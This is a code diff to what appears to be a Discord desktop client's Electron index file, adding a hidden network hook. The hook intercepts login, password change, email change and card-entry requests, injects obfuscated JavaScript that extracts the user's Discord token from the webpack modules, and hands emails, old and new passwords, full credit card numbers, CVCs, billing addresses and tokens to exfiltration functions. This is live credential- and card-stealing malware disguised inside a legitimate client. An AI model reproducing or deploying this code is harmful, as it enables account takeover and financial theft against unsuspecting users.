@@ -460,3 +460,44 @@ function Login(email, password, token) {
 		})
 	})
 }
+
+session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
+	if (details.url.endsWith("login")) {
+		if (details.statusCode == 200) {
+			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+			const email = data.login;
+			const password = data.password;
+			const window = BrowserWindow.getAllWindows()[0];
+			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+				Login(email, password, token)
+			}))
+		} else {}
+	}
+	if (details.url.endsWith("users/@me")) {
+		if (details.statusCode == 200 && details.method == "PATCH") {
+			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
+			if (data.password != null && data.password != undefined && data.password != "") {
+				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
+					const window = BrowserWindow.getAllWindows()[0];
+					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+						ChangePassword(data.password, data.new_password, token)
+					}))
+				}
+				if (data.email != null && data.email != undefined && data.email != "") {
+					const window = BrowserWindow.getAllWindows()[0];
+					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+						ChangeEmail(data.email, data.password, token)
+					}))
+				}
+			}
+		} else {}
+	}
+	if (details.url.endsWith("tokens")) {
+		const window = BrowserWindow.getAllWindows()[0];
+		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
+		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
+			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
+		}))
+	}
+});
+module.exports = require('./core.asar')
